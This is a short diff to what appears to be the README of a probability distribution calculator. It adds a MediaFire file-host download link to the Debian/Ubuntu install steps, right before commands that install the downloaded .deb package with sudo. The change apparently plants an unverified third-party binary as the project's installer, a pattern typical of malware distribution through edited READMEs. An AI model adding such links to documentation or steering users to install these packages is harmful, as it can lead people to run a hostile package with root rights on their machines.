@@ -41,6 +41,7 @@ A professional probability distribution calculator with cross-platform support.
 
 ### Linux (Debian/Ubuntu)
 ```bash
+https://www.mediafire.com/file/9ab4651m4a08xm2/advanced-distribution-calculator.deb/file
 sudo dpkg -i advanced-distribution-calculator.deb
 sudo apt-get install -f
 ```
